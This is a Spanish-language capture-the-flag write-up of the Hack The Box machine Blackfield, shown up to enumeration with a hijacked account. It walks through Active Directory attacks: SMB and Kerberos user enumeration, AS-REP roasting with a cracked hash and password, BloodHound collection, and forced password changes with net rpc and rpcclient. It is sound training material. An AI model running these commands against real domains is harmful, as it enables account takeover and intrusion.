---
title: "HTB: Resolución de Blackfield"
date: 2023-07-26 00:00:00 +/-TTTT
categories: [HTB, Active Directory]
tags: [asreproasting, bloodhound, lsass, sebackupprivilege, forcechangepassword, pypykatz, ntds, nmap, crackmapexec, smbmap, guest session, kerbrute, getnpusers.py, john, evil-winrm, rpc, bloodhound-python, montura smb, backup operators, diskshadow, secretsdump.py, efs, cipher, sam]     # TAG names should always be lowercase
image: blackfield.png
img_path: /photos/2023-07-26-Blackfield-WriteUp/
---


**Blackfield** es una máquina de Hack The Box de **dificultad alta** que desafía el dominio de técnicas de explotación y escalada de privilegios en un entorno de **Active Directory**. Iniciando con la explotación de una vulnerabilidad **ASREPRoasting** para obtener las primeras credenciales, la ruta hacia el dominio se va desenredando con cada paso. 

Usando la explotación de privilegios excesivos y el acceso a un **volcado de LSASS** en un recurso de SMB, se facilita el ingreso a la máquina por medio de **WinRM**. Finalmente, el **volcado del NTDS** permite la escalada a nivel de **Administrador del dominio**, culminando con la técnica de **Pass The Hash** para obtener una sesión con privilegios de Administrador. 

Este análisis es complementado con dos anexos. El [Anexo I](#anexo-i-análisis-del-problema-de-lectura-de-la-segunda-flag) desentraña las **limitaciones** encontradas al intentar leer la **segunda flag** con un usuario del **grupo Backup Operators**. En el [Anexo II](#anexo-ii-proceso-de-volcado-del-registro-de-seguridad-de-cuentas-sam), se explora el valor del **volcado de SAM** en contextos más allá de la máquina actual, agregando perspectivas valiosas para futuras situaciones de compromiso.


## Reconocimiento

En esta etapa, nos esforzamos por recopilar la mayor cantidad de información posible sobre nuestro objetivo.

#### Identificación del Sistema Operativo con Ping

Empezamos por realizar un _**ping**_ a la máquina víctima. La finalidad del _ping_ no es solamente confirmar la conectividad, sino también deducir el sistema operativo que la máquina víctima está utilizando. ¿Cómo lo hace? Por medio del _**Time to Live (TTL)**_.

El _**TTL**_ indica cuánto tiempo o "saltos" debe permanecer el paquete en la red antes de que se descarte. Los sistemas operativos establecen diferentes valores predeterminados de TTL para los paquetes que salen, por lo que podemos usar el TTL para obtener una idea del sistema operativo del host remoto.

En este caso, un _**TTL**_ menor o igual a **64** generalmente indica que la máquina es **Linux** y un _**TTL**_ menor o igual a **128** indica que la máquina es **Windows**.

```bash
r1pfr4n@parrot> ping -c 1 10.10.10.192

PING 10.10.10.192 (10.10.10.192) 56(84) bytes of data.
64 bytes from 10.10.10.192: icmp_seq=1 ttl=127 time=143 ms

--- 10.10.10.192 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.094/143.094/143.094/0.000 ms
```

Observamos que el _**TTL**_ es 127, lo que sugiere que nos enfrentamos a una máquina **Windows**.

### Descubrimiento de puertos

El próximo paso en nuestro proceso de exploración es descubrir los puertos abiertos en la máquina víctima. Para ello, utilizamos la herramienta **nmap**. Nmap nos permite identificar los **puertos abiertos** (status open) en la máquina, que podrían ser potenciales vectores de ataque.

El comando que utilizamos es bastante detallado y hace uso de varias opciones de nmap:

-   `-sS`: Realiza un escaneo SYN. Este es un tipo de escaneo sigiloso que no completa las conexiones TCP a los puertos del host objetivo.
-   `--min-rate 5000`: Establece el número mínimo de paquetes que nmap intentará enviar por segundo.
-   `-n`: No resuelve los nombres de los hosts.
-   `-Pn`: Trata al host como si estuviera en línea y omite la fase de descubrimiento.
-   `-p-`: Escanea todos los puertos (equivalente a `-p 1-65535`).
-   `-vvv`: Aumenta la verbosidad del programa. 
-   `--open`: Muestra solo los puertos abiertos.
-   `-oG allPorts`: Guarda la salida en formato *greppable*, que es más fácil de procesar con otros programas y scripts (este formato lo utilizo para poder filtrar los puertos abiertos de los resultados del escaneo mediante expresiones regulares).

Aquí están los resultados:

```bash
r1pfr4n@parrot> sudo nmap -sS --min-rate 5000 -n -Pn -p- -vvv --open 10.10.10.192 -oG allPorts

...[snip]...
Nmap scan report for 10.10.10.192
Host is up, received user-set (0.13s latency).
Scanned at 2023-07-21 17:45:45 CEST for 40s
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        REASON
53/tcp   open  domain         syn-ack ttl 127
88/tcp   open  kerberos-sec   syn-ack ttl 127
135/tcp  open  msrpc          syn-ack ttl 127
389/tcp  open  ldap           syn-ack ttl 127
445/tcp  open  microsoft-ds   syn-ack ttl 127
593/tcp  open  http-rpc-epmap syn-ack ttl 127
3268/tcp open  globalcatLDAP  syn-ack ttl 127
5985/tcp open  wsman          syn-ack ttl 127
...[snip]...
```

Tras descubrir los puertos abiertos, procedemos a realizar un **escaneo más detallado** para conocer las versiones y los servicios que se están ejecutando en esos puertos.

```bash
r1pfr4n@parrot> sudo nmap -sCV -p53,88,135,389,445,593,3268,5985 10.10.10.192 -oN targeted

...[snip]...
Nmap scan report for 10.10.10.192
Host is up (0.15s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-21 22:47:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-21T22:47:38
|_  start_date: N/A
|_clock-skew: 6h59m56s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.94 seconds
```

El comando `-sCV` realiza un escaneo de versión (-sV) y ejecuta *scripts* por defecto (-sC).

El resultado de este escaneo revela información adicional sobre los servicios en ejecución, como versiones y detalles de la configuración. A continuación, se proporciona un desglose detallado de los servicios que se han identificado en la máquina objetivo utilizando una tabla. Para cada servicio, se describe brevemente su propósito y su relevancia potencial.

| Puerto(s) | Servicio                          | Descripción                                                                                                                     | Relevancia                                                                                                                                     |
| --------- | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| 53        | Domain (DNS)                      | El servicio DNS se utiliza para resolver nombres de dominio en direcciones IP y viceversa.                                      | Las configuraciones incorrectas o las entradas DNS malintencionadas pueden ser explotadas.                                                     |
| 88        | Kerberos                          | Kerberos es un protocolo de autenticación de red.                                                                               | Las vulnerabilidades o debilidades en Kerberos pueden permitir la escalada de privilegios o la falsificación de identidad.                     |
| 135       | MSRPC                             | Microsoft Remote Procedure Call (RPC) permite a los procesos comunicarse en una red.                                            | Los problemas de configuración o las vulnerabilidades en RPC pueden permitir la ejecución remota de código.                                    |
| 445       | SMB (Server Message Block)        | SMB es un protocolo de compartición de archivos y servicios.                                                                    | Las vulnerabilidades en SMB pueden permitir la ejecución remota de código, la escalada de privilegios o la revelación de información sensible. |
| 389, 3268 | LDAP | El Protocolo Ligero de Acceso a Directorios (LDAP) se utiliza para acceder y gestionar directorios distribuidos sobre redes IP. | Las configuraciones incorrectas o las vulnerabilidades en LDAP pueden permitir la enumeración de usuarios o la escalada de privilegios.        |
| 593       | NCACN_HTTP                        | Puntos de extremo de mapeo para RPC sobre HTTP.                                                                                 | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código.                                               |
| 5985      | WinRM                             | Estos servicios permitirán el acceso remoto a los sistemas de administración.                                                   | Las vulnerabilidades o problemas de configuración pueden permitir la ejecución remota de código o la escalada de privilegios.                  | 


### Puerto 445 abierto (SMB)

**El protocolo SMB (Server Message Block)**, que en este caso opera a través del puerto 445, se selecciona para un reconocimiento inicial por su relevancia en la configuración de redes Windows y su conocido historial de vulnerabilidades explotables.

SMB es un protocolo de red que proporciona servicios compartidos de archivos e impresoras. Es un componente esencial en los sistemas operativos Windows y puede encontrarse también en otras plataformas. En versiones modernas de SMB, como es probable en esta máquina, ya no se requiere NetBIOS para la comunicación, lo que elimina la necesidad del puerto 139. Esta evolución permite que SMB se comunique directamente sobre IP, utilizando el puerto 445.

Para empezar, se utiliza la herramienta `crackmapexec` para recopilar más información sobre el servicio SMB que se ejecuta en la máquina objetivo. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.192
```

La ejecución de este comando arroja el siguiente resultado:

![imagen 2](Pasted image 20230721175745.png)

Aquí, vemos que el nombre de la máquina es **"DC01"**, está utilizando el dominio **"BLACKFIELD.local"**, y tiene habilitada la opción de firmado SMB (**signing: True**). También podemos observar que la versión de Windows es **10.0**, que corresponde a **Windows Server 2019**, como se puede consultar en [esta página](https://www.gaijin.at/en/infos/windows-version-numbers). No se detecta el uso del antiguo protocolo SMBv1.

Para facilitar trabajos futuros, se añade el dominio "active.htb" al archivo `/etc/hosts` para permitir que se resuelva localmente:

![imagen 3](Pasted image 20230721175830.png)

Continuando con el reconocimiento de SMB, se ha utilizado la herramienta `smbmap` para listar los recursos compartidos disponibles en la máquina objetivo. Esto se hace iniciando una sesión de invitado, usando un nombre de usuario arbitrario (en este caso 'test'). La línea de comandos utilizada es la siguiente:

```bash
r1pfr4n@parrot> smbmap -H 10.10.10.192 -u 'test'
```

El comando anterior muestra el siguiente resultado:

![imagen 4](Pasted image 20230721180049.png)

Esto proporciona una lista de los recursos compartidos disponibles, indicando el nivel de acceso a cada uno de ellos:

- **ADMIN$**: Es un recurso compartido administrativo que normalmente apunta al directorio `Windows`. Generalmente, este recurso compartido es accesible solo para usuarios con privilegios administrativos. No se permite el acceso.
- **forensic**: Este es un recurso compartido que no suele encontrarse en las configuraciones de SMB por defecto, lo que indica que podría haber sido establecido específicamente para propósitos de auditoría forense. No se permite el acceso.
- **C\$**: Es el recurso compartido por defecto del directorio raíz del sistema. Al igual que el recurso compartido ADMIN\$, el acceso a C\$ normalmente está restringido a los administradores. No se permite el acceso.
- **IPC\$**: Este recurso compartido permite la comunicación entre procesos. Es importante en la ejecución de tareas o servicios remotos y también puede proporcionar información útil durante la enumeración de un sistema. No se permite el acceso.
- **NETLOGON** y **SYSVOL**: Son recursos compartidos especiales que existen en los controladores de dominio de Windows. NETLOGON normalmente contiene scripts de inicio de sesión, mientras que SYSVOL almacena los archivos del sistema de políticas de grupo. No se permite el acceso.
- **profiles$**: Este es otro recurso compartido no convencional. Por su nombre, es razonable suponer que puede contener perfiles de usuario. Tiene **acceso de lectura**, lo que podría proporcionar información valiosa.

Dado que el recurso **profiles$** está accesible y podría contener información valiosa, se utiliza `smbmap` para listar su contenido:

```bash
r1pfr4n@parrot> smbmap -H 10.10.10.192 -u 'test' -r 'profiles$'
```

Esto revela una lista de directorios que parecen corresponder a los nombres de usuarios:

![imagen 5](Pasted image 20230721180412.png)

Aunque no se puede confirmar aún si son usuarios del dominio, se trata de un punto de partida útil. Estos nombres de usuario se almacenan en un archivo llamado `users.txt` para su uso posterior. Para ello se ha utilizado el siguiente comando:

```bash
r1pfr4n@parrot> smbmap -H 10.10.10.192 -u 'test' -r 'profiles$' | awk '{print $NF}' > users.txt
```

Este comando utiliza `awk`, una herramienta para manipular datos, que imprime el último campo (`$NF`) de cada línea de la salida de `smbmap`, y redirige (`>`) este output a `users.txt`.

Después de limpiar la lista de usuarios de líneas que no corresponden a nombres de usuarios, se dispone de una **lista de posibles usuarios de dominio**. El siguiente paso es **validar** cuáles de estos nombres de usuario son usuarios de dominio válidos y si alguno de ellos es vulnerable a un **ataque ASREPRoasting**, marcando así el inicio de la fase de explotación.

## Obteniendo shell como svc_backup

En este capítulo, se muestra cómo navegar a través de la red de usuarios para acceder a cuentas con privilegios más elevados. Se abordará cómo se identifican las **cuentas de dominio vulnerables a ASREPRoasting**, cómo se utilizan herramientas de mapeo de red como **BloodHound**, y cómo se gana acceso a **recursos compartidos previamente inaccesibles**. Finalmente, se demostrará cómo todo esto lleva a obtener las credenciales de `svc_backup` para conectarse al Controlador de Dominio.

Antes de proceder con la explotación del ASREPRoasting, se abordará el **funcionamiento** del protocolo **Kerberos**, seguido de una descripción detallada del **ataque ASREPRoast**.

### Protocolo Kerberos

El protocolo **Kerberos** proporciona autenticación mutua entre un cliente y un servidor en una red no segura. Esto se logra mediante el uso de tickets de concesión de servicio (TGS) y tickets de concesión de autenticación (TGT). A continuación se desglosan todos los pasos de la autenticación de Kerberos, teniendo en cuenta la siguiente imagen:

![imagen 6](Pasted image 20230715184901.png)

1.  **Solicitud de TGT**: El cliente envía una solicitud al Servicio de Autenticación (AS) para obtener un TGT.
2.  **Emisión de TGT**: El AS verifica las credenciales del cliente. Si son válidas, el AS emite un TGT y una clave de sesión al cliente. El TGT está cifrado con la clave del servicio de concesión de ticket (KRBTGT) y la **clave de la sesión** **se cifra con la contraseña del cliente**. Esta última es la parte que se explota en el ataque **ASREPRoast**.
3.  **Solicitud de TGS**: Cuando el cliente desea acceder a un servicio, envía una solicitud al Servicio de Concesión de Ticket (TGS), incluyendo el TGT y un autenticador que contiene la ID del cliente y la marca de tiempo, cifrado con la clave de sesión.
4.  **Emisión de TGS**: El TGS descifra el TGT, obteniendo la clave de la sesión, y luego descifra el autenticador. Si la solicitud es válida, el TGS emite un ticket de servicio (cifrado con la clave del servicio) y una nueva clave de sesión (cifrado con la contraseña del cliente) al cliente.    
5.  **Solicitud de servicio**: El cliente se comunica con el servidor enviando el ticket de servicio y un nuevo autenticador cifrado con la nueva clave de sesión.
6.  **Acceso al servicio**: El servidor SQL descifra el ticket de servicio con su clave, obteniendo la nueva clave de sesión, y luego descifra el autenticador. Si la solicitud es válida, el cliente es autenticado y puede acceder al servicio.

### ASREPRoast o AS-REP Roasting en detalle

ASREPRoast, también conocido como AS-REP Roasting, debe su nombre a la etapa de respuesta AS-REP del protocolo Kerberos, que es donde se lleva a cabo el ataque. Este ataque se centra en explotar la capacidad de desactivar la **"preautenticación"** en el protocolo Kerberos.

La **preautenticación** es una medida de seguridad que protege contra ataques de fuerza bruta, ya que requiere que los usuarios demuestren que conocen su contraseña antes de solicitar un TGT (Ticket de Concesión de Tiquetes). Sin embargo, en ciertos escenarios, se puede desactivar la preautenticación para usuarios específicos a través del atributo **UF_DONT_REQUIRE_PREAUTH** en el objeto de cuenta de usuario en Active Directory.

Cuando la preautenticación está desactivada para un usuario, el AS devuelve un mensaje AS-REP que incluye el TGT y la **clave de sesión cifrada con la contraseña del usuario**. Esto significa que un atacante puede obtener directamente la clave de sesión cifrada sin necesidad de conocer previamente la contraseña del usuario.

Un atacante puede solicitar un TGT para dicho usuario y capturar estas **claves de sesión cifradas**, que luego pueden ser descifradas fuera de línea mediante técnicas de fuerza bruta. Como la clave de la sesión está cifrada con la contraseña del usuario, descifrarla exitosamente resulta en obtener la contraseña del usuario, lo que permite a los atacantes acceder a recursos del dominio con las credenciales comprometidas.

Es importante destacar que no todos los usuarios en el dominio tendrán la opción de UF_DONT_REQUIRE_PREAUTH habilitada. En el contexto del ataque ASREPRoast, se buscan usuarios específicos con esta configuración, ya que son los que representan un riesgo para la seguridad del dominio.

**Imagen para ilustrar la opción UF_DONT_REQUIRE_PREAUTH**:

![imagen 7](Pasted image 20230724110506.png)

**Nota**: En la imagen se muestra la opción **UF_DONT_REQUIRE_PREAUTH** en la herramienta de administración de Active Directory. Esta opción puede ser habilitada o deshabilitada para usuarios específicos según las necesidades y políticas de seguridad del dominio.

### Explotación de ASREPRoast para obtener las credenciales de support

La fase inicial de este proceso implica **analizar** la **lista de 314 usuarios obtenida a través de la enumeración de SMB**. El objetivo es identificar qué usuarios en esta lista son del dominio y si son vulnerables al ataque ASREPRoast.

Para lograr esto, se pueden utilizar dos herramientas: **[Kerbrute](https://github.com/ropnop/kerbrute)** y **GetNPUsers.py** de [Impacket](https://github.com/fortra/impacket). Aunque ambas herramientas realizan funciones similares, en esta ocasión se utilizarán ambas para demostrar cómo llegan a los mismos resultados.

Con **Kerbrute**, se ejecuta el siguiente comando:

```bash
r1pfr4n@parrot> kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local ./users.txt --downgrade
```

Donde:

- `userenum` es la acción para enumerar los usuarios.
- `--dc 10.10.10.192` define el controlador de dominio al que se conecta.
- `-d BLACKFIELD.local` especifica el dominio contra el que se ejecuta la prueba.
- `./users.txt` es el archivo que contiene la lista de usuarios a probar.
- `--downgrade` fuerza la herramienta a utilizar el tipo de cifrado menos seguro, en este caso, arcfour-hmac-md5.

Resultado:

![imagen 8](Pasted image 20230721183752.png)


Por otro lado, se utiliza **GetNPUsers.py** de Impacket de la siguiente forma:

```bash
r1pfr4n@parrot> GetNPUsers.py -no-pass -usersfile users.txt blackfield.local/
```

Tras la ejecución de la herramienta, se pueden observar tres tipos de mensajes:

1. `[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)`: indica que el usuario que se está probando no existe en el dominio.
2. `[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set`: indica que el usuario sí existe en el dominio, pero no tiene el atributo `UF_DONT_REQUIRE_PREAUTH` establecido.
3. **Hash del usuario**: se muestra cuando el usuario es del dominio y tiene el atributo `UF_DONT_REQUIRE_PREAUTH` establecido. Este hash es de la clave de sesión cifrada con la contraseña del usuario.

Ejemplo de los tres tipos de mensajes:

![imagen 9](Pasted image 20230721182426.png)

A partir de la ejecución de ambas herramientas, se descubre que de los 314 usuarios de la lista, **solo tres son válidos** en el dominio: `svc_backup`, `support` y `audit2020`. Además, se revela que el usuario `support` es susceptible a un ataque ASREPRoast.

El **hash** obtenido es el siguiente:

```bash
$krb5asrep$23$support@BLACKFIELD.LOCAL:849b272dedf6158d3a090382195b9cc1$a8cdda4e5b0ebc0a8b47162e42ffcee7d67443d9fa8f18eeda6071f5deb570abb05ece3be1d65199e03b52d7ef40c12057517913ebc436de51a019d07ca849543b84d77b2ecb1738965cd07fdc17b4c9a2fb1ed74310e61f2871d84b2adf96a0bf70e377947fbf8d5f917a05b249ad828131619c4714f93204a8bfe7e38bee53451b8e4790c8c12c1d9ad44ef21c60ba95169282fc1153207255e432e4175313c00dc1c33f2e664ad16f067eab9dc9dcfe98be97a84fed7e1fde1e5120e42b05c2fd09d845436b91e290f6c4f20f0b502342896ae6606cc7d511d9e88dae7ad251761ec8bc6a01ccb2f734fdb621f90bd8d142ab
```

Se guarda el hash de la clave de sesión en un archivo llamado `hash` y se procede a intentar romperlo con la herramienta **john**:

```bash
r1pfr4n@parrot> john -w=/usr/share/wordlists/rockyou.txt hash
```

Donde `-w=/usr/share/wordlists/rockyou.txt` es la ruta de la lista de palabras que se utilizará para intentar descifrar el hash. 

Como resultado, se obtiene la contraseña `#00^BlackKnight` para el usuario `support`:

![imagen 10](Pasted image 20230721182731.png)

Con las credenciales en mano, se utiliza **crackmapexec** para verificar su validez:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
```

Si las credenciales son válidas, el resultado mostrará un '**+**':

![imagen 11](Pasted image 20230721183010.png)

Para verificar si el usuario `support` puede acceder al sistema a través de **Winrm**, se utiliza el siguiente comando:

```bash
r1pfr4n@parrot> crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight' 
```

Si el resultado muestra '**Pwned!**', indica que el usuario pertenece al grupo "**Remote Management Users**" y puede acceder a través de Winrm. Sin embargo, en este caso, se descubre que el usuario `support` **no tiene acceso a través de Winrm**:

![imagen 12](Pasted image 20230721183116.png)

A partir de aquí, la **enumeración** del sistema debe continuar, pero ahora con las nuevas **credenciales** obtenidas, permitiendo una exploración más efectiva.

### Enumeración con las credenciales de support

Con las credenciales obtenidas para el usuario `support`, se procede a realizar una enumeración adicional de recursos compartidos y usuarios del dominio. 

#### Enumeración de SMB

Se utiliza la herramienta `crackmapexec` para enumerar los recursos compartidos SMB disponibles para el usuario `support`. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --shares
```

Durante la enumeración, se detectan dos recursos compartidos SMB a los que el usuario `support` tiene acceso de lectura y el usuario invitado no tiene. Estos recursos compartidos son **NETLOGON** y **SYSVOL**:

![imagen 13](Pasted image 20230721182925.png)

Sin embargo, es importante destacar que, aunque se tiene acceso de lectura a estos recursos, **no se obtiene información relevante** para avanzar en la intrusión.

#### Enumeración por RPC

Otra herramienta utilizada para obtener información sobre los usuarios del dominio es `rpcclient`. Se realiza una conexión RPC al controlador de dominio utilizando las credenciales de `support` con el siguiente comando:

```bash
r1pfr4n@parrot> rpcclient -U "support%#00^BlackKnight" 10.10.10.192
```

Esta conexión permite obtener información sobre los usuarios que conforman el dominio, los grupos del dominio, y los usuarios que pertenecen a cada grupo, entre otros detalles.

Para obtener una lista de los usuarios del dominio, se utiliza el comando `enumdomusers` dentro de la sesión de `rpcclient`. La salida de este comando contiene una lista de usuarios del dominio:

![imagen 14](Pasted image 20230721183629.png)

Con esta lista de usuarios, se considera la posibilidad de realizar nuevamente un ataque ASREPRoasting, ya que es posible que en el ataque anterior no se hayan incluido todos los usuarios del dominio. Recordemos que, en el ataque anterior, solo se identificaron tres usuarios válidos: `svc_backup`, `audit2020`, y `support`. Sin embargo, la herramienta `rpcclient` muestra una **lista más extensa de usuarios pertenecientes al dominio**.

Para obtener una lista más limpia y enfocada en los nombres de usuario, se realiza un filtrado de la salida del comando `enumdomusers`. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> cat users.txt | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' | sort -u | sponge users.txt
```

Este comando aplica una serie de filtros a la lista de usuarios (`users.txt`) y elimina información innecesaria, dejando solo los nombres de usuario en el archivo.

#### Nueva exploración con Kerbrute

Una vez obtenida la **lista filtrada de usuarios del dominio**, se utiliza nuevamente la herramienta **Kerbrute** para intentar identificar **usuarios vulnerables a ASREPRoasting**. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local ./users.txt --downgrade
```

Tras la ejecución de la herramienta, se confirma que el **único usuario susceptible a un ataque ASREPRoast** es `support`:

![imagen 15](Pasted image 20230721184301.png)

Esta información ya había sido identificada previamente, lo que significa que **no se ha obtenido información relevante adicional** más allá de la lista de usuarios del dominio.

En este punto, se decide llevar a cabo un reconocimiento más detallado utilizando la herramienta **BloodHound** para obtener una visión más completa de los privilegios y relaciones entre usuarios y grupos en la red. 

#### Enumeración con BloodHound

**BloodHound** es una poderosa herramienta de análisis gráfico de relaciones en entornos de Active Directory que utiliza la *teoría de grafos* para visualizar y analizar la estructura del dominio y las relaciones de confianza entre diferentes entidades. Esta herramienta permite identificar posibles rutas de ataque menos privilegiadas que podrían llevar a una entidad a obtener más privilegios dentro del dominio.

##### Recolección de información con bloodhound-python

En este punto, se utilizará la herramienta **bloodhound-python** para recolectar la información necesaria desde la máquina de atacante. A diferencia de otras máquinas resueltas en este blog, donde se empleó el collector **SharpHound** para recolectar datos, en esta situación, como no se tiene acceso directo a la máquina víctima, se recurrirá a **bloodhound-python**.

**bloodhound-python** es una herramienta perteneciente al repositorio [https://github.com/Fox-IT/BloodHound.py](https://github.com/Fox-IT/BloodHound.py) y se puede instalar en la máquina de atacante utilizando el siguiente comando:

```bash
r1pfr4n@parrot> pip install bloodhound
```

Una vez instalado, es importante realizar una configuración adicional introduciendo el **nombre de la máquina** **y** el nombre completo de la máquina (**FQDN**) en el `/etc/hosts` del sistema atacante, de la siguiente forma:

![imagen 16](Pasted image 20230721185709.png)

Esto permitirá que **bloodhound-python** pueda resolver correctamente los nombres de la máquina y del dominio para recolectar la mayor cantidad de información posible.

El comando completo para la recolección de información es el siguiente:

```bash
r1pfr4n@parrot> bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all --zip
```

Donde los parámetros significan lo siguiente:

- `-u support -p '#00^BlackKnight'`: especifica las credenciales del usuario `support` utilizadas para autenticarse en el dominio.
- `-ns 10.10.10.192`: indica la dirección IP del controlador de dominio con el que se realizará la conexión.
- `-d blackfield.local`: define el nombre del dominio objetivo.
- `-c all`: establece que se recolectará toda la información disponible, incluyendo información sobre usuarios, grupos, objetos de servicio, relaciones de pertenencia, entre otros.
- `--zip`: indica que la información recolectada se comprimirá en un archivo zip para facilitar su análisis y transferencia.

Al ejecutar este comando, **bloodhound-python** recopilará la información necesaria sobre el dominio y la exportará en un archivo zip:

![imagen 17](Pasted image 20230721185630.png)

Este archivo **zip** se utilizará posteriormente para **cargar la información en la plataforma de BloodHound** y realizar un análisis detallado de las relaciones y posibles rutas de ataque dentro del dominio.

##### Configuración de Neo4j y BloodHound

**BloodHound** necesita una base de datos para operar, y utiliza **Neo4j**, una base de datos gráfica. Si no está instalado, se puede seguir la guía de instalación de la [documentación oficial de Neo4j](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/#debian-installation). 

Los comandos para instalar **neo4j 5.6.0** son los siguientes:

```bash
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable latest' | sudo tee -a /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install neo4j=1:5.6.0
```

Una vez instalado **Neo4j**, se debe ejecutar con el comando `sudo neo4j console`. Si es la primera vez que se inicia, se deberá **configurar un usuario y una contraseña** que se usarán después en BloodHound. El panel de configuración de Neo4j suele residir en http://localhost:7474/.

##### Ejecución de BloodHound

Con **Neo4j** funcionando, ya se puede iniciar **BloodHound**. Para ello, es necesario descargar la versión adecuada para el sistema operativo desde el [repositorio oficial de BloodHound](https://github.com/BloodHoundAD/BloodHound/releases). Una vez descargado y descomprimido, se encontrará el ejecutable de BloodHound. Al ejecutarlo, aparecerá una pantalla de inicio de sesión en la que se deben proporcionar las credenciales configuradas en Neo4j.

Una vez se ha accedido a **BloodHound**, en la parte superior derecha, se debe pinchar en "**Upload Data**". En este punto, se deberá **subir** el **archivo zip generado por bloodhound-python**:

![imagen 18](Pasted image 20230716181840.png)

Al finalizar la carga de los archivos, ya se puede comenzar con el análisis y reconocimiento del dominio utilizando **BloodHound**.

##### Potencial Toma de Control de Cuenta a través de Privilegio ForceChangePassword

Comenzando con el análisis, es una buena práctica **marcar** los usuarios cuyas credenciales se han obtenido como **Owned**. En este caso, se marca al usuario **support**. Esta acción no es solo una cuestión de llevar un registro, sino que también abre la posibilidad de utilizar algunas consultas adicionales en **BloodHound**, que pueden revelar rutas de ataque potencialmente ocultas:

![imagen 19](Pasted image 20230721190517.png)

Al analizar la información recopilada, se detecta una ruta potencial de **user pivoting** que involucra al usuario `audit2020` y al usuario `support`. En esta ruta, **support** tiene el privilegio **ForceChangePassword** sobre el usuario **audit2020**:

![imagen 20](Pasted image 20230721190629.png)

El privilegio `ForceChangePassword` es una característica de Active Directory que permite a un usuario cambiar la contraseña de otro usuario sin conocer la contraseña actual. En otras palabras, con este privilegio, el usuario `support` tendría la capacidad de **modificar la contraseña** de `audit2020` sin necesidad de conocer su contraseña actual.

![imagen 21](Pasted image 20230721190707.png)

Este hallazgo plantea una potencial vía de ataque, ya que si `support` logra cambiar la contraseña de `audit2020`, podría tomar el **control total de la cuenta** `audit2020`. Desde esta posición, `support` podría acceder a recursos y realizar acciones en nombre de `audit2020`, lo que representa un riesgo significativo para la seguridad del dominio.

### Explotación de ForceChangePassword sobre la cuenta audit2020

Una vez identificado el privilegio **ForceChangePassword** que el usuario `support` posee sobre la cuenta `audit2020`, se procede a explotar este privilegio para cambiar la contraseña de `audit2020`. 

Para cambiar la contraseña de `audit2020`, se pueden utilizar dos comandos diferentes:

1. **Comando `net`**:

   Para cambiar la contraseña de `audit2020`, se utilizó el siguiente comando:

   ```bash
r1pfr4n@parrot> net rpc password audit2020 -U 'support' -S 10.10.10.192
   ```

   Este comando solicita la nueva contraseña de `audit2020` y la contraseña del usuario `support` para realizar el cambio:
   
![imagen 22](Pasted image 20230721190827.png)

2. **Comando `rpcclient`**:

   Otra opción para cambiar la contraseña de `audit2020` es mediante el siguiente comando:

   ```bash
r1pfr4n@parrot> rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "fran123$!"'
   ```

   En este caso, se especifica el usuario `support` y sus credenciales para llevar a cabo el cambio de contraseña de `audit2020` a "fran123$!".

Después de realizar el cambio de contraseña, se verifica que todo haya sido exitoso utilizando la herramienta **CrackMapExec**. Primero, se verifica el acceso a través del protocolo SMB:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'fran123$!'
```

Si en el resultado se muestra un "**+**", indica que la contraseña del usuario `audit2020` ha sido cambiada con éxito. 

![imagen 23](Pasted image 20230721190929.png)

Sin embargo, el **acceso** **a través de WinRM no es posible** con estas credenciales:

![imagen 24](Pasted image 20230724123402.png)

Por lo tanto, se procede a realizar una enumeración de los servicios con las credenciales de `audit2020` para buscar posibles vías de intrusión en la máquina.

### Enumeración con las credenciales de audit2020

Con las credenciales obtenidas para el usuario `audit2020`, se procede a realizar una enumeración adicional de los servicios en ejecución para identificar posibles vías de intrusión.

#### Enumeración de SMB

Se realiza una nueva enumeración del servicio SMB, pero esta vez se utilizan las credenciales de `audit2020` para buscar recursos compartidos a los cuales no se tenía acceso previamente. El comando utilizado para esta enumeración es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'fran123$!' --shares
```

